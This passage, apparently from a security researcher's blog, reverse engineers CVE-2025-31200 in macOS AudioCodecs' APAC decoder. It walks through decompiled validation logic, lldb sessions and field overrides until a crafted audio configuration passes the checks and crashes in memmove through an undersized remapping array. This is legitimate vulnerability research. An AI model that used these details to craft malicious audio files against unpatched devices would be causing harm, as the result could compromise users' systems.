</span></span><span><span>3</span><span>	<span>apac</span><span>::</span><span>ConstParamArray</span><span>&lt;</span><span>apac</span><span>::</span><span>ProfileLevel</span><span>&gt;</span> <span>const</span><span>&amp;</span> <span>arg2</span><span>)</span></span></span></code></pre></div><p>There are two arguments:</p>
<ul>
<li><code>arg1</code>: A const reference to a vector of unique pointers to <code>IASCConfig</code> objects</li>
<li><code>arg2</code>: A const reference to a <code>ConstParamArray</code> of <code>ProfileLevel</code> objects</li>
</ul>
<h2 id="understanding-the-error">Understanding the Error</h2>
<p>The function itself is quite short and has a lot of symbols still in it, so I took a crack at reverse engineering it. The first major clue was the outer loop structure:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>for</span> <span>(</span><span>int64_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>!=</span> <span>0x78</span><span>;</span> <span>i</span> <span>+=</span> <span>0x28</span><span>)</span></span></span></code></pre></div><p>This told me we‚Äôre dealing with three iterations (0x78 / 0x28 = 3), with each iteration stepping by 40 bytes. This suggested an array of three structures, each 40 bytes long. Combined with the function name <code>InferProfileFromCodecConfigs</code>, I guessed that this pointed to three different ‚Äòaudio profile configurations.‚Äô The fact that this step size is used to index into multiple global arrays (<code>&amp;apac::kProfileConfigs + i</code>, <code>i + &amp;data_8ec838</code>, etc.) confirmed these are parallel arrays because they were indexed by the same offset.</p>
<p>The very first lines inside the loop revealed the <code>ConstParamArray</code> layout:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>int16_t</span><span>*</span> <span>x8_1</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)</span><span>arg2</span><span>;</span>        <span>// Offset +0 (Start)
</span></span></span><span><span>2</span><span><span></span><span>int64_t</span> <span>x9_1</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)((</span><span>char</span><span>*</span><span>)</span><span>arg2</span> <span>+</span> <span>8</span><span>);</span>  <span>// Offset +8 (End)
</span></span></span></code></pre></div><p>This is the classic C++ iterator pattern‚Äîa begin/end pointer pair. The <code>ConstParamArray&lt;ProfileLevel&gt;</code> is clearly just:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>struct</span> <span>ConstParamArray</span> <span>{</span>
</span></span><span><span>2</span><span>    <span>const</span> <span>ProfileLevel</span><span>*</span> <span>begin</span><span>;</span>  <span>// +0
</span></span></span><span><span>3</span><span><span></span>    <span>const</span> <span>ProfileLevel</span><span>*</span> <span>end</span><span>;</span>    <span>// +8  
</span></span></span><span><span>4</span><span><span></span><span>};</span></span></span></code></pre></div><p>The <code>int16_t*</code> cast suggests <code>ProfileLevel</code> contains 16-bit values, and the loop that follows confirms this:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>while</span> <span>(</span><span>/* condition */</span><span>)</span> <span>{</span>
</span></span><span><span>2</span><span>    <span>x8_1</span> <span>=</span> <span>&amp;</span><span>x8_1</span><span>[</span><span>2</span><span>];</span>  <span>// Advance by 2 int16_t values
</span></span></span><span><span>3</span><span><span></span>    <span>if</span> <span>(</span><span>x8_1</span> <span>==</span> <span>x9_1</span><span>)</span> <span>break</span><span>;</span>
</span></span><span><span>4</span><span><span>}</span></span></span></code></pre></div><p>This <code>&amp;x8_1[2]</code> advancement pattern hinted that <code>ProfileLevel</code> is 4 bytes (2 √ó 16-bit values):</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>struct</span> <span>ProfileLevel</span> <span>{</span>
</span></span><span><span>2</span><span>    <span>uint16_t</span> <span>profile</span><span>;</span>
</span></span><span><span>3</span><span>    <span>uint16_t</span> <span>level</span><span>;</span> 
</span></span><span><span>4</span><span><span>};</span></span></span></code></pre></div><p>Next there were these virtual method calls:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>int64_t</span><span>*</span> <span>x26_1</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)</span><span>arg1</span><span>;</span> <span>// x26_1 = IASCConfig
</span></span></span><span><span>2</span><span><span>// Continues
</span></span></span><span><span>3</span><span><span></span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)(</span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)(</span><span>**</span><span>(</span><span>uint64_t</span><span>**</span><span>)</span><span>x26_1</span> <span>+</span> <span>0x28</span><span>))()</span> 
</span></span><span><span>4</span><span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)(</span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)(</span><span>**</span><span>(</span><span>uint64_t</span><span>**</span><span>)</span><span>x26_1</span> <span>+</span> <span>0x30</span><span>))()</span></span></span></code></pre></div><p>This is a standard C++ virtual function call pattern: <code>object-&gt;vtable[offset]()</code>. The double dereference <code>**(uint64_t**)x26_1</code> gets us to the vtable, then we index into it at offsets <code>+0x28</code> and <code>+0x30</code>. Earlier in the code, there‚Äôs also a simpler access pattern:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>*</span><span>(</span><span>uint32_t</span><span>*</span><span>)(</span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)</span><span>x26_1</span> <span>+</span> <span>8</span><span>)</span></span></span></code></pre></div><p>This suggests a data member access at offset +8 in the object, not a virtual call. So the <code>IASCConfig</code> structure likely looks like:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>struct</span> <span>IASCConfig</span> <span>{</span>
</span></span><span><span>2</span><span>    <span>void</span><span>*</span> <span>vtable</span><span>;</span>           <span>// +0
</span></span></span><span><span>3</span><span><span></span>    <span>uint32_t</span> <span>codec_type</span><span>;</span>    <span>// +8 (accessed directly)
</span></span></span><span><span>4</span><span><span></span>    <span>// Any other members
</span></span></span><span><span>5</span><span><span></span><span>};</span></span></span></code></pre></div><p>With virtual functions at vtable offsets <code>+0x28</code> and <code>+0x30.</code> The return statements were also revealing:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>return</span> <span>(</span><span>uint64_t</span><span>)</span><span>*</span><span>(</span><span>uint16_t</span><span>*</span><span>)(</span><span>&amp;</span><span>apac</span><span>::</span><span>kProfileConfigs</span> <span>+</span> <span>i</span><span>)</span> <span>|</span> <span>x25_1</span> <span>&lt;&lt;</span> <span>0x10</span><span>;</span></span></span></code></pre></div><p>This showed that:</p>
<ol>
<li>The ‚Äòprofile ID‚Äô is stored as the first 16-bit value in each <code>ProfileConfig</code> entry</li>
<li>The ‚Äòlevel‚Äô (<code>x25_1</code>) gets shifted left by 16 bits</li>
<li>The result is packed as <code>profile | (level &lt;&lt; 16)</code></li>
</ol>
<p>Then there was a fairly cryptic bit manipulation sequence:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>if</span> <span>(</span><span>!</span><span>(</span><span>x12_3</span> <span>&amp;</span> <span>0xffff</span><span>))</span>
</span></span><span><span> 2</span><span>    <span>z_1</span> <span>=</span> <span>x12_3</span> <span>==</span> <span>0xffff0000</span><span>;</span>
</span></span><span><span> 3</span><span><span>else</span>  
</span></span><span><span> 4</span><span>    <span>z_1</span> <span>=</span> <span>true</span><span>;</span>
</span></span><span><span> 5</span><span>
</span></span><span><span> 6</span><span><span>if</span> <span>(</span><span>!</span><span>z_1</span><span>)</span>
</span></span><span><span> 7</span><span>    <span>z_2</span> <span>=</span> <span>!</span><span>(</span><span>x12_3</span> <span>&amp;</span> <span>0xfffeffff</span><span>);</span>
</span></span><span><span> 8</span><span><span>else</span>
</span></span><span><span> 9</span><span>    <span>z_2</span> <span>=</span> <span>true</span><span>;</span>
</span></span><span><span>10</span><span>
</span></span><span><span>11</span><span><span>if</span> <span>(</span><span>!</span><span>z_2</span><span>)</span>
</span></span><span><span>12</span><span>    <span>x13_2</span> <span>=</span> <span>x10_4</span> <span>&amp;</span> <span>0xffff0000</span><span>;</span>  
</span></span><span><span>13</span><span><span>else</span>
</span></span><span><span>14</span><span>    <span>x13_2</span> <span>=</span> <span>x10_4</span><span>;</span>               
</span></span></code></pre></div><p>This revealed some kind of matching system where:</p>
<ul>
<li>Some requirements are wildcards (<code>0xffff0000</code>)</li>
<li>Some match only the upper 16 bits</li>
<li>Others require exact matches</li>
<li>The capability values are structured as 32-bit words with different significance for upper/lower 16 bits</li>
</ul>
<p>Throughout the function, the same offset <code>i</code> is used to index into multiple global arrays:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>&amp;</span><span>apac</span><span>::</span><span>kProfileConfigs</span> <span>+</span> <span>i</span>           <span>// Profile configurations
</span></span></span><span><span>2</span><span><span></span><span>i</span> <span>+</span> <span>&amp;</span><span>data_8ec838</span>                     <span>// Level config start pointers  
</span></span></span><span><span>3</span><span><span></span><span>i</span> <span>+</span> <span>&amp;</span><span>data_8ec840</span>                     <span>// Level config end pointers
</span></span></span><span><span>4</span><span><span></span><span>i</span> <span>+</span> <span>&amp;</span><span>data_8ec848</span>                     <span>// Capability requirement start
</span></span></span><span><span>5</span><span><span></span><span>i</span> <span>+</span> <span>&amp;</span><span>data_8ec850</span>                     <span>// Capability requirement end
</span></span></span></code></pre></div><p>Looking back at the callsite the most revealing part is how the return value is checked:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>if</span> <span>(</span><span>!</span><span>(</span><span>0xffff</span> <span>&amp;</span> <span>~</span><span>x0_43</span><span>)</span> <span>||</span> <span>x0_44</span> <span>&gt;</span> <span>0x1f</span> <span>||</span> <span>(</span><span>x0_43</span> <span>&amp;</span> <span>0xffff</span><span>)</span> <span>&gt;</span> <span>0x1f</span>
</span></span><span><span>2</span><span>    <span>||</span> <span>x0_44</span> <span>&gt;</span> <span>(</span><span>uint32_t</span><span>)(</span><span>uint16_t</span><span>)</span><span>x0_43</span><span>)</span>
</span></span><span><span>3</span><span><span>{</span>
</span></span><span><span>4</span><span>    <span>// ERROR: Wrong profile index in GlobalConfig
</span></span></span><span><span>5</span><span><span></span><span>}</span></span></span></code></pre></div><p>The condition <code>!(0xffff &amp; ~x0_43)</code> is true when <code>(x0_43 &amp; 0xffff) == 0xffff</code> - meaning the function returned the failure value <code>0xffff</code>. But more interestingly, it shows that <strong>profile IDs must be ‚â§ 31</strong> (<code>&gt; 0x1f</code> triggers an error). This suggests support for up to 32 different audio profiles.</p>
<p>In lldb I dumped the entire <code>profileLevel</code> array:</p>





<pre tabindex="0"><code>(lldb) p/x *(uint64_t*)($x1)
(uint64_t) 0x000000010073a59c
(lldb) p/x *(uint64_t*)($x1+0x8)
(uint64_t) 0x000000010073a61c

(lldb) x/32x 0x000000010073a59c
0x10073a59c: 0x00000000 0x000f0001 0x000f0002 0x000f0003
0x10073a5ac: 0x000f0004 0x00020005 0x000f0006 0x000f0007
...
0x10073a60c: 0x000f001c 0x000f001d 0x000f001e 0x0006001f</code></pre><p>Interpreting these as <code>ProfileLevel</code> pairs (profile in low 16 bits, level in high 16 bits):</p>
<ul>
<li><code>0x00000000</code> = Profile 0, Level 0</li>
<li><code>0x000f0001</code> = Profile 1, Level 15</li>
<li><code>0x000f0002</code> = Profile 2, Level 15</li>
<li><code>0x00020005</code> = Profile 5, Level 2</li>
<li><code>0x0006001f</code> = Profile 31, Level 6</li>
</ul>
<p>Most profiles support level 15, but profile 5 only supports level 2, and profile 31 only supports level 6, for example.  Another check in the error condition is:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>x0_44</span> <span>&gt;</span> <span>(</span><span>uint32_t</span><span>)(</span><span>uint16_t</span><span>)</span><span>x0_43</span></span></span></code></pre></div><p>Where <code>x0_44</code> comes from <code>*(uint16_t*)((char*)arg1 + 0x20)</code> - this appears to be the <strong>currently configured profile</strong> from the <code>GlobalConfig</code> object.</p>
<p>So the check is: ‚Äúcurrent_profile &gt; inferred_profile‚Äù. This suggests the function is trying to find a profile that‚Äôs <strong>at least as capable</strong> as what‚Äôs currently configured. If it can only find a ‚Äúlower‚Äù profile, that‚Äôs an error condition.</p>
<p>With this understanding of the error conditions, I initially suspected the issue was simply an <strong>empty codec configurations vector</strong>. The logic seemed straightforward: if no codecs are configured, the function should default to the basic profile. But when I stepped through the actual execution in lldb and got to to the point where the function checks the size of the vector, I found that it actually contained one 8-byte entry:</p>





<pre tabindex="0"><code>(lldb) reg read x26 x27
     x26 = 0x0000600000310190  # begin
     x27 = 0x0000600000310198  # end</code></pre><p>Examining the codec configuration entry:</p>





<pre tabindex="0"><code>(lldb) x/2gx 0x0000600002ba0290
0x600002ba0290: 0x0000000158604b70 0x0000000000000000</code></pre><p>This contained a pointer to an actual <code>CodecConfig</code> object. Following that pointer revealed:</p>





<pre tabindex="0"><code>m read 0x0000000158604b70 --format A
0x158604b70: 0x0000000100a37640 AudioCodecs`vtable for apac::hoa::CodecConfig + 16</code></pre><p>The vtable pointed to <code>apac::hoa::CodecConfig</code>.</p>
<p>Stepping through the profile matching logic, I found that:</p>
<ul>
<li>Profile 31 <strong>does support</strong> HOA codec ID 2</li>
<li>The level validation <strong>passed</strong> (level 6 requirements met)</li>
<li>But validation <strong>failed</strong> during a later check</li>
</ul>
<p>The function made two virtual method calls on the codec object:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span><span>; First call: GetNumChannels()
</span></span></span><span><span>2</span><span><span></span>ldr    <span>x8</span>, <span>[</span><span>x16</span>, #<span>0x28</span><span>]!</span>
</span></span><span><span>3</span><span>blraa  <span>x8</span>, <span>x17</span>              <span>; Returns channel count
</span></span></span><span><span>4</span><span><span></span>cmp    <span>w23</span>, <span>w0</span>              <span>; Compare with level requirement
</span></span></span><span><span>5</span><span><span></span>
</span></span><span><span>6</span><span><span>; Second call: GetChannelLayout()  
</span></span></span><span><span>7</span><span><span></span>ldr    <span>x8</span>, <span>[</span><span>x16</span>, #<span>0x30</span><span>]!</span>
</span></span><span><span>8</span><span>blraa  <span>x8</span>, <span>x17</span>              <span>; Returns channel layout tag
</span></span></span></code></pre></div><p>Through lldb, I could see the<code>apac::hoa::CodecConfig::GetNumChannels()</code> ‚Üí returned 0xffff. I didn‚Äôt yet see <code>GetChannelLayout</code> being executed. It then hit this check where the number of channels was compared against presumably the maximum:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span>cmp    <span>w23</span>, <span>w0</span>
</span></span><span><span>2</span><span>b<span>.lo</span>   <span>0</span><span>x10</span><span>0350e98</span></span></span></code></pre></div><p>w23 here was 0x79. So this check failed and the function returned.  It was instantly failing because of the way we were overriding the channel layout tag (with a huge <code>numChannels</code>):</p>





<div><pre tabindex="0"><code data-lang="c++"><span><span>1</span><span><span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> 
</span></span><span><span>2</span><span>	<span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0xffff</span><span>;</span></span></span></code></pre></div><p>So I went back and set it to a more reasonable channel layout tag. I tried setting the channel count to 0x78:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> 
</span></span><span><span>2</span><span>	<span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0x78</span><span>;</span></span></span></code></pre></div><p>This time, <code>GetNumChannels()</code> returned 0x78, which passed the channel count check (0x78 &lt; 0x79). The function progressed to the next validation stage and made a vtable call to <code>GetChannelLayout().</code></p>
<p>The function loaded two pointers defining the supported ACL (Audio Channel Layout) tags for the profile:</p>





<pre tabindex="0"><code>(lldb) reg read x8 x9
x8 = 0x000000010073a61c  AudioCodecs`apac::main_profile::kSupportedACLTags
x9 = 0x000000010073a6bc  AudioCodecs`apac::low_profile::kSupportedACLTags</code></pre><p>It then entered a loop comparing my channel layout tag against each supported tag:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span>ldr    <span>w10</span>, <span>[</span><span>x0</span><span>]</span>           <span>; Load codec's channel layout tag
</span></span></span><span><span>2</span><span><span></span>and    <span>w11</span>, <span>w10</span>, #<span>0xffff0000</span>  <span>; Extract format bits
</span></span></span><span><span>3</span><span><span></span>ldr    <span>w12</span>, <span>[</span><span>x8</span><span>]</span>           <span>; Load supported tag from list
</span></span></span><span><span>4</span><span><span>; ... ...
</span></span></span><span><span>5</span><span><span></span>cmp    <span>w13</span>, <span>w12</span>            <span>; Compare processed values
</span></span></span><span><span>6</span><span><span></span>b<span>.eq</span>   <span>success</span>             <span>; Found match!
</span></span></span><span><span>7</span><span><span></span>add    <span>x8</span>, <span>x8</span>, #<span>0x4</span>        <span>; Next supported tag
</span></span></span><span><span>8</span><span><span></span>cmp    <span>x8</span>, <span>x9</span>              <span>; End of list?
</span></span></span><span><span>9</span><span><span></span>b<span>.ne</span>   <span>loop</span>                <span>; Continue if more tags
</span></span></span></code></pre></div><p>My layout was <code>0x00be</code> (the CoreAudio HOA format tag). It was compared against a number of apparently supported values until it found 0x00be. It then returned 0, which fixed the error! However, if I just let it continue from there, then there still was no crash, and lldb showed the same exact error message as before: ‚ÄúERROR: Wrong profile index in GlobalConfig.‚Äù Lets break down the error checking sequence at the callsite even further:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>x23</span> <span>=</span> <span>return_value</span><span>;</span>  <span>// x23 = 0 (Profile 0, Level 0)
</span></span></span><span><span> 2</span><span><span></span>
</span></span><span><span> 3</span><span><span>// Check 1: Did function return failure?
</span></span></span><span><span> 4</span><span><span></span><span>if</span> <span>(</span><span>!</span><span>(</span><span>0xffff</span> <span>&amp;</span> <span>~</span><span>x23</span><span>))</span> <span>{</span>  <span>// !(0xffff &amp; ~0) = !(0xffff) = false
</span></span></span><span><span> 5</span><span><span></span>    <span>// This check passes - function didn't return 0xffff
</span></span></span><span><span> 6</span><span><span></span><span>}</span>
</span></span><span><span> 7</span><span>
</span></span><span><span> 8</span><span><span>// Check 2: Is current profile valid?
</span></span></span><span><span> 9</span><span><span></span><span>w0</span> <span>=</span> <span>*</span><span>(</span><span>uint16_t</span><span>*</span><span>)(</span><span>global_config</span> <span>+</span> <span>0x20</span><span>);</span>  <span>// w0 = 5 (current profile)
</span></span></span><span><span>10</span><span><span></span><span>if</span> <span>(</span><span>w0</span> <span>&gt;</span> <span>0x1f</span><span>)</span> <span>{</span>  <span>// 5 &gt; 31? No
</span></span></span><span><span>11</span><span><span></span>    <span>// This check passes
</span></span></span><span><span>12</span><span><span></span><span>}</span>
</span></span><span><span>13</span><span>
</span></span><span><span>14</span><span><span>// Check 3: Is inferred profile valid?  
</span></span></span><span><span>15</span><span><span></span><span>w8</span> <span>=</span> <span>x23</span> <span>&amp;</span> <span>0xffff</span><span>;</span>  <span>// w8 = 0 (inferred profile)
</span></span></span><span><span>16</span><span><span></span><span>if</span> <span>(</span><span>w8</span> <span>&gt;</span> <span>0x1f</span><span>)</span> <span>{</span>  <span>// 0 &gt; 31? No  
</span></span></span><span><span>17</span><span><span></span>    <span>// This check passes
</span></span></span><span><span>18</span><span><span></span><span>}</span>
</span></span><span><span>19</span><span>
</span></span><span><span>20</span><span><span>// Check 4: Is current profile compatible with inferred?
</span></span></span><span><span>21</span><span><span></span><span>if</span> <span>(</span><span>w0</span> <span>&gt;</span> <span>(</span><span>x23</span> <span>&amp;</span> <span>0xffff</span><span>))</span> <span>{</span>  <span>// 5 &gt; 0? YES!
</span></span></span><span><span>22</span><span><span></span>    <span>// ERROR: Current profile (5) &gt; inferred profile (0)
</span></span></span><span><span>23</span><span><span></span><span>}</span></span></span></code></pre></div><p>The function did find a match for the tag <code>0x00be0078</code>, but it found it in the <strong>wrong profile‚Äôs supported tags list.</strong> The function searches backwards from <code>main_profile</code> toward <code>low_profile</code>. Since it found <code>0x00be</code> in the low_profile list, it returned Profile 0 instead of a higher profile. But GlobalConfig is for some reason set to profile 5. Since 5 &gt; 0, it fails with ‚ÄúWrong profile index in GlobalConfig.‚Äù  Essentially, <code>GlobalConfig</code> found 0x00be0078 in profile zero‚Äôs configuration. This was puzzling. the function <strong>was</strong> finding my HOA format, but returning the wrong profile.</p>
<p>I dumped the <code>kSupportedProfileLevels</code> array that maps specific configurations to profiles:</p>





<pre tabindex="0"><code>(lldb) x/32wx *(uint64_t*)($x1)
0x10073a59c: 0x00000000 0x000f0001 0x000f0002 0x000f0003
0x10073a5ac: 0x000f0004 0x00020005 0x000f0006 0x000f0007
...
0x10073a60c: 0x000f001c 0x000f001d 0x000f001e 0x0006001f</code></pre><p>Notably, there‚Äôs no <code>0x00be0078</code> entry. After some more confusion I took a look at the <code>kSupportedACLTags</code>:</p>





<pre tabindex="0"><code>(lldb) x/64x *(uint64_t*)$x1+0x80
0x10073a61c: 0x00640001 0x00650002 0x00720003 0x006c0004
0x10073a62c: 0x00740004 0x00780005 0x007c0006 0x008d0006
...
0x10073a70c: 0x00730004 0x00750005 0x00790006 0x00830003</code></pre><p>Since my GlobalConfig was set to Profile 5, I needed to find a channel count that would map to Profile 5. Looking at the <code>kSupportedProfileLevels</code> array, I found <code>0x00020005</code> which decodes to:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>0x00020005</span> <span>=</span> <span>(</span><span>Level</span> <span>2</span> <span>&lt;&lt;</span> <span>16</span><span>)</span> <span>|</span> <span>Profile</span> <span>5</span>
</span></span><span><span>2</span><span><span>// This means some configuration maps to Profile 5, Level 2
</span></span></span></code></pre></div><p>The question was: which input produces this output? The pattern suggested it would be a HOA layout with fewer channels. Since the return value <code>0x00020005</code> indicated 5 channels were involved, I tried:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> 
</span></span><span><span>2</span><span>    <span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0x5</span><span>;</span></span></span></code></pre></div><p>This time, the function returned <code>0x00020005</code> - exactly matching the profile levels table entry! The validation passed because:</p>
<ul>
<li>Current GlobalConfig Profile: <strong>5</strong></li>
<li>Inferred Profile: <strong>5</strong></li>
<li>Check: <code>5 ‚â§ 5</code> passes!</li>
</ul>
<p>This worked!</p>
<h2 id="playback">Playback</h2>
<p>When I ran the harness in lldb all I saw was: <code>Process * exited with status = 0 (0x00000000)</code>. At least according to the deserializer, we managed to create a valid APAC magic cookie. However, still no crash, nor any message from ASan. The most interesting thing to me was that this new audio file showed the exact same error message on the new version as before (it was still hitting the new check!), and showed nothing on the unpatched version.</p>
<p>When I saw this I really didn‚Äôt know where to look. I thought that the process of looking at the diff between the two versions would be enough. Here it is again as I was looking at it at this point, cleaned up:</p>
<p><img alt="Screenshot 2025-05-30 at 7.52.36\u202fPM.png" src="https://blog.noahhw.dev/posts/cve-2025-31200/images/finalDiff.png"></p>
<p>This was essentially <em>all</em> that had changed. I took a break for a while here, and worked on another project that had spawned out of this one (a way to do runtime patching which actually works for these system libraries on MacOS since I couldn‚Äôt get TinyINST or even Frida to work). Chasing down this AudioCodecs bug seemed out of reach. I mean there are so many possible places that the code could go in the enormous MacOS audio processing pipeline. Without a clear diff between two binaries with the issue, as I had had until this point, where would I even look?</p>
<p>As I worked on my other project, I kept thinking about this. Eventually I decided to take some time to try and come at it from a slightly different angle. Maybe it would help to understand a bit about what‚Äôs actually being done by the code at the level of audio processing more than just control flow/code itself.</p>
<p>I looked for references to <code>m_TotalComponents</code> in <code>apac::hoa::CodecConfig::Deserialize</code>. It is calculated in the following kind of snippet (much like everything else in this method):</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>if</span> <span>(</span><span>this</span><span>-&gt;</span><span>some_flag</span> <span>==</span> <span>1</span><span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>	<span>uint32_t</span> <span>AmbisonicOrder</span> <span>=</span> <span>apac</span><span>::</span><span>GetEscBits</span><span>&lt;</span><span>6u</span><span>,</span> <span>8u</span><span>&gt;</span><span>(</span><span>readerPtr</span><span>,</span> <span>numBits</span><span>);</span>
</span></span><span><span> 3</span><span>	<span>numHoaCoeffs</span> <span>=</span> <span>(</span><span>AmbisonicOrder</span> <span>+</span> <span>1</span><span>)</span> <span>*</span> <span>(</span><span>AmbisonicOrder</span> <span>+</span> <span>1</span><span>);</span>
</span></span><span><span> 4</span><span>	<span>// The number of HOA coeffs for order N is (N + 1)¬≤
</span></span></span><span><span> 5</span><span><span></span>	<span>m_maxNumSalientComponents</span> <span>=</span> <span>apac</span><span>::</span><span>GetEscBits</span><span>&lt;</span><span>6u</span><span>,</span> <span>8u</span><span>&gt;</span><span>(</span><span>readerPtr</span><span>,</span> <span>numBits</span><span>);</span>
</span></span><span><span> 6</span><span>	<span>uint32_t</span> <span>numBits</span> <span>=</span> <span>floor</span><span>(</span><span>log2</span><span>(</span><span>this</span><span>-&gt;</span><span>numHoaCoeffs</span><span>));</span>
</span></span><span><span> 7</span><span>	<span>/*
</span></span></span><span><span> 8</span><span><span>	Parse numScalarCodedComponents from the stream.
</span></span></span><span><span> 9</span><span><span>	The number of HOA Coefficients determines numScalarCodedComponents
</span></span></span><span><span>10</span><span><span>	log2(n) gives how many bits are needed to represent n
</span></span></span><span><span>11</span><span><span>	*/</span>
</span></span><span><span>12</span><span>	<span>this</span><span>-&gt;</span><span>m_TotalComponents</span> <span>=</span> <span>numScalarCodedComponents</span> <span>+</span> <span>m_maxNumSalientComponents</span><span>;</span>
</span></span><span><span>13</span><span><span>}</span>
</span></span><span><span>14</span><span><span>// Some checks to ensure this state is okay:
</span></span></span><span><span>15</span><span><span></span><span>if</span> <span>(</span><span>numHoaCoeffs</span> <span>&lt;</span> <span>122</span> <span>&amp;&amp;</span> <span>m_maxNumSalientComponents</span> <span>&lt;=</span> <span>numHoaCoeffs</span> <span>&amp;&amp;</span> <span>numScalarCodedComponents</span> <span>&lt;=</span> <span>numHoaCoeffs</span><span>)</span> <span>{</span>
</span></span><span><span>16</span><span>	<span>// Continue with parsing
</span></span></span><span><span>17</span><span><span></span><span>}</span>
</span></span><span><span>18</span><span><span>else</span> <span>{</span>
</span></span><span><span>19</span><span>	<span>// Log error
</span></span></span><span><span>20</span><span><span></span><span>}</span></span></span></code></pre></div><p>Here is what I believe to be true about the different audio terms of jargon here:</p>
<ul>
<li><strong>Components</strong> are spatial/directional elements (salient vs. ambient/scalar)
<ul>
<li>Think the difference between highlighted important noise coming at you from some particular direction, and just embient noise in the background.</li>
</ul>
</li>
<li><strong>Subbands</strong> are frequency divisions</li>
<li><strong>Salient Components</strong> (<code>m_maxNumSalientComponents</code>): The most important spatial features, encoded with high precision</li>
<li><strong>Scalar/Direct Components</strong> (<code>numScalarCodedComponents</code>): Less important components using simpler scalar coding</li>
<li><strong>Ambient data</strong>, which is sized per-subband as you always need background spatial info for each frequency band</li>
</ul>
<p>My understanding is that there are essentially three types of components, and two of them, <code>m_maxNumSalientComponents</code> and <code>numScalarCodedComponents</code>, add together to be <code>m_TotalComponents</code>. Thinking back to the fix being essentially:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>-</span> <span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>uint8_t</span><span>&gt;</span> <span>m_RemappingArray</span><span>(</span><span>m_ChannelLayoutTag</span><span>);</span>
</span></span><span><span>2</span><span><span>+</span> <span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>uint8_t</span><span>&gt;</span> <span>m_RemappingArray</span><span>(</span><span>m_TotalComponenets</span><span>);</span></span></span></code></pre></div><p>The fact that the remapping array was initially sized by Apple based on the <a href="https://developer.apple.com/documentation/coreaudiotypes/1572101-audio_channel_layout_tags?changes=_7&amp;language=objc">ChannelLayoutTag</a> (the bottom two bytes of which indicate the number of channels), tells us that there is a relationship between the number of channels and the remapping array. I was trying to understand what that relationship could even be. According to <a href="https://www.wildlifeacoustics.com/resources/faqs/what-is-an-audio-channel?token=iHleyIFjO6AyNj0dwv2pyKSq5_BGTm76">wildlifeacoustics.com</a>, ‚Äúa channel is a representation of sound coming from or going to a single point. A single microphone can produce one channel of audio, and a single speaker can accept one channel of audio, for example.‚Äù Presumably then, the <code>m_RemappingArray</code> is a way of mapping the spatial components of HOA to a given channel based layout. Therefore, there must be some later stage in the audio processing pipeline that actually ‚Äúremaps‚Äù the spatial components to the channel layout. If there is some mismatch between the two, perhaps it <em>tries</em> to remap one based on the other, and ends up reaching out of bounds since they are different sizes?</p>
<p>It turns out that is precisely the exploit primitive.</p>
<h2 id="the-bug">The Bug</h2>
<p>I should have realized this earlier, but if we actually <em>play</em> the audio in addition to just <em>preparing to play</em> as our harness did, then that is very plausibly when the remapping occurs. I hadn‚Äôt tried this before because the vulnerable code section, as found through diffing, is perfectly reachable without ever actually playing the audio. You can just call <code>[AVAudioPlayer prepareToPlay]</code>. However, if we add in that single line of code to our harness, then with the exact audio file we have at this stage then we segfault inside a call to <code>memmove</code>!</p>
<p><img alt="Screenshot 2025-05-30 at 11.51.31\u202fPM.png" src="https://blog.noahhw.dev/posts/cve-2025-31200/images/memMoveSegfault.png"></p>
<p>Just to be clear, here is how I was setting up the audio file at this point:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>// Run this function through an lldb hook in 
</span></span></span><span><span> 2</span><span><span>// apac::hoa::CodecConfig::Serialize
</span></span></span><span><span> 3</span><span><span></span><span>void</span> <span>OverrideApac</span><span>(</span><span>CodecConfig</span><span>*</span> <span>config</span><span>)</span> <span>{</span>
